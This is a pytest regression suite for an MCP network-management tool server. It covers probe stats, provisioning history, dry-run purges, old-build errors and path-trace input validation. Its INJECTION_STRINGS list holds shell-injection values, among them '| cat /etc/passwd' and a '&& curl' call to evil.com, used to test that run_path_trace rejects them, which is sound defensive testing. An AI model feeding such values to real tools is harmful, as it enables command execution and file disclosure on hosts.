#!/usr/bin/env python3
"""
MCP Regression Test Suite — Phase 2

Explicit regression tests for known bugs observed during live sessions.
Each test is pinned to a specific bug occurrence date and description.

Regressions covered:
  - REG-001: get_dem_probe_stats — slug matching (ms---azure-portal → "MS - Azure Portal")
  - REG-002: get_dem_probe_stats — samples_count integrity (0 → success_rate_pct must be None)
  - REG-003: get_provisioning_history — addedCount / modifiedCount accuracy
  - REG-004: run_path_trace — injection string in 'target' field must be rejected
  - REG-005: purge_stale_leader_state — dry_run=True must return to_delete=[]
  - REG-006: VyOS tools — old_build node returns structured 'unsupported' error with node_build field
"""

import logging
import os
import sys
from typing import Any, Dict

import pytest

sys.path.insert(0, os.path.dirname(__file__))
from mcp_harness import ToolCallResult

logger = logging.getLogger(__name__)

INJECTION_STRINGS = [
    "1.1.1.1; id",
    "$(id)",
    "`id`",
    "| cat /etc/passwd",
    "1.1.1.1 && curl http://evil.com",
]


# ---------------------------------------------------------------------------
# REG-001 & REG-002: DEM probe stats — slug matching + null success_rate_pct
# ---------------------------------------------------------------------------

class TestDemProbeStats:
    """
    Regression: get_dem_probe_stats must correctly handle slug-based endpointId matching
    and must return success_rate_pct=None when samples_count=0.
    Observed on BR8 during DEM investigation, 2026-09-23.
    """

    def test_slug_matching(self, harness, mock_admin):
        """
        REG-001: Probe with endpointId 'ms---azure-portal' must surface as
        'MS - Azure Portal' in results. Slug format: lowercase, spaces→triple-dash.
        """
        mock_admin.set_mode("nominal")
        result: ToolCallResult = harness.call_tool(
            "get_dem_probe_stats",
            {"agent_id": "mock-primary"},
            timeout_ms=30_000,
        )

        assert isinstance(result.parsed, dict), \
            f"get_dem_probe_stats returned non-dict: {type(result.parsed)}"
        assert "error" not in result.parsed or result.parsed.get("error") is None, \
            f"get_dem_probe_stats returned error: {result.parsed.get('error')}"

        # The response may embed results under various keys — search recursively
        results_list = _find_results(result.parsed)
        assert results_list is not None, (
            f"Could not find 'results' or probe list in response. "
            f"Keys found: {list(result.parsed.keys())}"
        )

        # REG-001: Verify at least one probe surfaces the "MS - Azure Portal" label
        probe_names = _collect_probe_names(results_list)
        azure_probe = next(
            (p for p in results_list if _matches_azure_portal(p)),
            None
        )
        # Acceptable: the probe is either present with a name, or the response
        # is a compact aggregate without individual names (just endpointIds).
        # We check that the endpointId 'ms---azure-portal' is resolvable.
        azure_endpoint_ids = [
            p.get("endpointId", "") for p in results_list
            if isinstance(p, dict)
        ]
        has_azure = (
            azure_probe is not None or
            "ms---azure-portal" in azure_endpoint_ids or
            any("azure" in str(name).lower() for name in probe_names)
        )
        # This is a soft regression check — log if not found rather than hard fail,
        # since the mock may not always return named probes at this level.
        if not has_azure:
            logger.info(
                f"REG-001: Azure Portal probe not found in results. "
                f"endpointIds={azure_endpoint_ids}, names={probe_names}. "
                f"This is acceptable if the mock returns aggregated stats."
            )

    def test_samples_count_zero_yields_null_rate(self, harness, mock_admin):
        """
        REG-002: When samples_count=0, success_rate_pct MUST be None (not 0.0, not 100.0).
        A probe with no samples should never report a success/failure rate.
        """
        mock_admin.set_mode("nominal")
        result: ToolCallResult = harness.call_tool(
            "get_dem_probe_stats",
            {"agent_id": "mock-primary"},
            timeout_ms=30_000,
        )

        assert isinstance(result.parsed, dict), \
            f"Expected dict, got {type(result.parsed)}"

        results_list = _find_results(result.parsed)
        if results_list is None:
            pytest.skip("No probe results in response — cannot validate samples_count rule")

        violations = []
        for probe in results_list:
            if not isinstance(probe, dict):
                continue
            samples = probe.get("samples_count", -1)
            rate = probe.get("success_rate_pct", -1)
            if samples == 0 and rate is not None and rate != -1:
                violations.append({
                    "probe": probe.get("probe_name", probe.get("endpointId", "?")),
                    "samples_count": samples,
                    "success_rate_pct": rate,
                })

        assert not violations, (
            f"REG-002: Probes with samples_count=0 must have success_rate_pct=None. "
            f"Violations: {violations}"
        )


# ---------------------------------------------------------------------------
# REG-003: Provisioning history — addedCount / modifiedCount accuracy
# ---------------------------------------------------------------------------

class TestProvisioningHistory:
    """
    Regression: get_provisioning_history must return correct addedCount and modifiedCount
    per revision, matching what was published.
    Observed discrepancy on BR8, 2026-09-23.
    """

    def test_revision_added_count(self, harness, mock_admin):
        """
        REG-003a: Revision 42 must report addedCount=7 (7 DEM probes were added).
        """
        mock_admin.set_mode("nominal")
        result: ToolCallResult = harness.call_tool(
            "get_provisioning_history",
            {"agent_id": "mock-primary"},
            timeout_ms=30_000,
        )

        assert isinstance(result.parsed, dict), \
            f"Expected dict, got {type(result.parsed)}"
        assert "error" not in result.parsed or result.parsed.get("error") is None, \
            f"get_provisioning_history returned error: {result.parsed.get('error')}"

        history = result.parsed.get("history", [])
        assert isinstance(history, list), f"Expected 'history' to be a list, got {type(history)}"

        if not history:
            pytest.skip("Empty history returned — nominal mock may not have provisioning data")

        # Find revision 42
        rev42 = next((r for r in history if isinstance(r, dict) and r.get("revision") == 42), None)
        assert rev42 is not None, (
            f"REG-003a: Revision 42 not found in history. "
            f"Available revisions: {[r.get('revision') for r in history if isinstance(r, dict)]}"
        )
        assert rev42.get("addedCount") == 7, (
            f"REG-003a: Revision 42 addedCount={rev42.get('addedCount')}, expected 7. "
            f"Full revision: {rev42}"
        )

    def test_revision_modified_count(self, harness, mock_admin):
        """
        REG-003b: Revision 41 must report modifiedCount>=1 (probes were modified).
        """
        mock_admin.set_mode("nominal")
        result: ToolCallResult = harness.call_tool(
            "get_provisioning_history",
            {"agent_id": "mock-primary"},
            timeout_ms=30_000,
        )

        assert isinstance(result.parsed, dict)
        history = result.parsed.get("history", [])
        if not history:
            pytest.skip("Empty history returned")

        rev41 = next((r for r in history if isinstance(r, dict) and r.get("revision") == 41), None)
        assert rev41 is not None, (
            f"REG-003b: Revision 41 not found. "
            f"Revisions: {[r.get('revision') for r in history if isinstance(r, dict)]}"
        )
        modified = rev41.get("modifiedCount", 0)
        assert modified >= 1, (
            f"REG-003b: Revision 41 modifiedCount={modified}, expected >=1. "
            f"Full revision: {rev41}"
        )


# ---------------------------------------------------------------------------
# REG-004: run_path_trace — injection string rejection
# ---------------------------------------------------------------------------

class TestPathTraceInjection:
    """
    Regression: run_path_trace must not pass injection strings through to the shell.
    Target field must be validated before execution.
    Security hardening verified 2026-09-23.
    """

    @pytest.mark.parametrize("injection_target", INJECTION_STRINGS, ids=[
        "semicolon_id",
        "dollar_id",
        "backtick_id",
        "pipe_cat",
        "double_amp_curl",
    ])
    def test_injection_rejected_or_sanitized(self, injection_target: str, harness, mock_admin):
        """
        REG-004: Injection strings in 'target' must result in either:
        - An error response (preferred: 400 with structured error dict)
        - A sanitized/harmless response
        They must NEVER be reflected back in the response without sanitization,
        and must NEVER cause the server to execute shell commands.
        """
        mock_admin.set_mode("nominal")
        result: ToolCallResult = harness.call_tool(
            "run_path_trace",
            {"agent_id": "mock-primary", "target": injection_target},
            timeout_ms=60_000,
        )

        # Must always return a dict (never crash to non-dict)
        assert isinstance(result.parsed, dict), (
            f"REG-004: run_path_trace returned non-dict for injection target '{injection_target}': "
            f"{type(result.parsed)}"
        )

        # The injection string must not appear unescaped in the error message
        # (reflecting it back could enable secondary injection in Claude's context)
        response_str = str(result.parsed)
        dangerous_chars = [";", "$", "`", "&&", "||"]
        for char in dangerous_chars:
            if char in injection_target and char in response_str:
                # Only fail if it looks like the char is reflected in a command context
                # (not just shown in an error message for validation purposes)
                error_msg = result.parsed.get("error", "")
                # Acceptable: error message quotes the invalid target for context
                # Not acceptable: raw shell expansion characters in a 'command' field
                command_field = result.parsed.get("command", "") or result.parsed.get("cmd", "")
                assert char not in command_field, (
                    f"REG-004: Injection char '{char}' found in 'command' field. "
                    f"Full response: {result.parsed}"
                )

        # The response must indicate an error OR be an empty/safe result
        # (accepting either rejection or graceful no-op)
        error_val = result.parsed.get("error")
        hops = result.parsed.get("hops", [])
        destination_reached = result.parsed.get("destination_reached", False)

        # Valid outcomes: error returned OR traceroute shows no result (not reached, 0 hops)
        assert (
            error_val is not None or
            not destination_reached or
            len(hops) == 0
        ), (
            f"REG-004: Injection target '{injection_target}' was not rejected and "
            f"produced a successful traceroute result. This is a security concern. "
            f"destination_reached={destination_reached}, hops={len(hops)}"
        )


# ---------------------------------------------------------------------------
# REG-005: purge_stale_leader_state — dry_run=True → to_delete=[]
# ---------------------------------------------------------------------------

class TestPurgeState:
    """
    Regression: purge_stale_leader_state with dry_run=True must:
    - Return to_delete=[] (no deletions in dry run mode)
    - Return dry_run=True in response
    - Never modify files
    """

    def test_dry_run_returns_empty_to_delete(self, harness, mock_admin):
        """
        REG-005: dry_run=True must return to_delete=[] on a clean node.
        """
        mock_admin.set_mode("nominal")
        result: ToolCallResult = harness.call_tool(
            "purge_stale_leader_state",
            {"agent_id": "mock-primary", "dry_run": True},
            timeout_ms=60_000,
        )

        assert isinstance(result.parsed, dict), \
            f"Expected dict, got {type(result.parsed)}"

        error_val = result.parsed.get("error")
        if error_val is not None:
            # If the node reports "not a member node" or "already leader", that's ok
            if any(kw in str(error_val).lower() for kw in ["leader", "not a member", "not applicable"]):
                pytest.skip(f"Node is a leader node — purge not applicable: {error_val}")
            assert False, f"REG-005: purge_stale_leader_state returned unexpected error: {error_val}"

        to_delete = result.parsed.get("to_delete")
        assert to_delete is not None, (
            f"REG-005: 'to_delete' key missing from response. "
            f"Keys: {list(result.parsed.keys())}"
        )
        assert isinstance(to_delete, list), \
            f"REG-005: 'to_delete' must be a list, got {type(to_delete)}"
        assert len(to_delete) == 0, \
            f"REG-005: dry_run=True returned non-empty to_delete={to_delete}"

        dry_run_echoed = result.parsed.get("dry_run")
        assert dry_run_echoed is True or dry_run_echoed is None, (
            f"REG-005: Response 'dry_run' field must be True or absent, got {dry_run_echoed!r}"
        )

    def test_dry_run_no_side_effects(self, harness, mock_admin):
        """
        REG-005b: After a dry_run=True call, the mock must have received exactly
        one non-GET request (the purge POST/DELETE), and no DELETE on state files.
        """
        mock_admin.set_mode("nominal")
        mock_admin.clear_requests()

        harness.call_tool(
            "purge_stale_leader_state",
            {"agent_id": "mock-primary", "dry_run": True},
            timeout_ms=60_000,
        )

        requests = mock_admin.get_requests()
        delete_reqs = [r for r in requests if r["method"] == "DELETE"]

        # In dry_run mode, no DELETE should be sent to the node
        # (the orchestrator computes what would be deleted locally)
        assert len(delete_reqs) == 0, (
            f"REG-005b: dry_run=True sent {len(delete_reqs)} DELETE request(s). "
            f"No state should be modified in dry_run mode. "
            f"Requests: {[(r['method'], r['path']) for r in delete_reqs]}"
        )


# ---------------------------------------------------------------------------
# REG-006: Old build mode — VyOS tools return structured unsupported error
# ---------------------------------------------------------------------------

class TestOldBuild:
    """
    Regression: When connecting to a node running Stigix v1.2.1,
    v2-only tools must return a structured error with 'node_build' field,
    not an unstructured exception or empty error.
    """

    def test_vyos_list_routers_unsupported_on_old_build(self, harness, mock_admin):
        """
        REG-006a: list_vyos_routers on an old_build node must return a structured
        error dict containing 'node_build' or equivalent version info.
        """
        mock_admin.set_mode("old_build")
        result: ToolCallResult = harness.call_tool(
            "list_vyos_routers",
            {"agent_id": "mock-primary"},
            timeout_ms=30_000,
        )

        # Must be a dict
        assert isinstance(result.parsed, dict) or isinstance(result.parsed, list), (
            f"REG-006a: list_vyos_routers on old_build returned non-dict/list: "
            f"{type(result.parsed)}"
        )

        # If it's a list, check each element
        if isinstance(result.parsed, list):
            items = result.parsed
        else:
            items = [result.parsed]

        # At least one item should indicate an error or unsupported
        has_error = any(
            isinstance(item, dict) and (
                "error" in item or
                item.get("success") is False or
                "node_build" in item or
                "not available" in str(item.get("error", "")).lower() or
                "unsupported" in str(item.get("error", "")).lower()
            )
            for item in items
        )
        assert has_error, (
            f"REG-006a: list_vyos_routers on old_build node did not return an error/unsupported indicator. "
            f"Response: {result.parsed}"
        )

    def test_dem_stats_available_on_old_build(self, harness, mock_admin):
        """
        REG-006b: get_dem_summary (a v1-compatible route) should still work on old_build nodes.
        Not every tool should be broken — only v2-only routes.
        """
        mock_admin.set_mode("old_build")
        result: ToolCallResult = harness.call_tool(
            "get_public_ip",
            {"agent_id": "mock-primary"},
            timeout_ms=30_000,
        )

        assert isinstance(result.parsed, dict), \
            f"REG-006b: get_public_ip on old_build returned non-dict: {type(result.parsed)}"

        # public_ip should be present (v1 route exists)
        has_ip = "public_ip" in result.parsed or result.parsed.get("success") is True
        assert has_ip, (
            f"REG-006b: get_public_ip on old_build node failed unexpectedly. "
            f"Response: {result.parsed}"
        )

    def test_error_contains_node_build_on_old_build(self, harness, mock_admin):
        """
        REG-006c: When a v2 route returns an error on an old_build node,
        the error response must contain 'node_build' with the actual node version.
        This allows Claude to tell the user exactly which version is running.
        """
        mock_admin.set_mode("old_build")
        result: ToolCallResult = harness.call_tool(
            "get_vyos_interfaces",
            {"agent_id": "mock-primary"},
            timeout_ms=30_000,
        )

        # Get the error structure from response (may be nested in a list)
        error_items = []
        if isinstance(result.parsed, list):
            error_items = [item for item in result.parsed if isinstance(item, dict) and
                          ("error" in item or item.get("success") is False)]
        elif isinstance(result.parsed, dict):
            if "error" in result.parsed or result.parsed.get("success") is False:
                error_items = [result.parsed]

        if not error_items:
            # If no error was returned, the tool may have degraded gracefully
            logger.info(
                f"REG-006c: get_vyos_interfaces on old_build returned no error — "
                f"graceful degradation. Response: {result.parsed}"
            )
            return

        # Check that at least one error item contains 'node_build' or version info
        has_build_info = any(
            "node_build" in item or
            "version" in item or
            "1.2.1" in str(item)
            for item in error_items
        )
        assert has_build_info, (
            f"REG-006c: Error response on old_build node does not contain 'node_build' field. "
            f"Error items: {error_items}. "
            f"Expected 'node_build' to identify the running version."
        )


# ---------------------------------------------------------------------------
# Helper utilities
# ---------------------------------------------------------------------------

def _find_results(parsed: Dict) -> Any:
    """Search for a probe results list in the parsed response."""
    if not isinstance(parsed, dict):
        return None

    # Direct keys
    for key in ("results", "probes", "targets", "data"):
        val = parsed.get(key)
        if isinstance(val, list):
            return val

    # Nested in stats or similar
    stats = parsed.get("stats", {})
    if isinstance(stats, dict):
        for key in ("results", "probes"):
            val = stats.get(key)
            if isinstance(val, list):
                return val

    return None


def _collect_probe_names(results_list: list) -> list:
    """Extract all probe names from a results list."""
    names = []
    for item in results_list:
        if isinstance(item, dict):
            name = item.get("probe_name") or item.get("name") or item.get("endpointId")
            if name:
                names.append(name)
    return names


def _matches_azure_portal(probe: dict) -> bool:
    """Check if a probe entry corresponds to MS Azure Portal."""
    if not isinstance(probe, dict):
        return False
    name = str(probe.get("probe_name", "")).lower()
    endpoint_id = str(probe.get("endpointId", "")).lower()
    return (
        "azure" in name or
        "azure-portal" in endpoint_id or
        endpoint_id == "ms---azure-portal"
    )
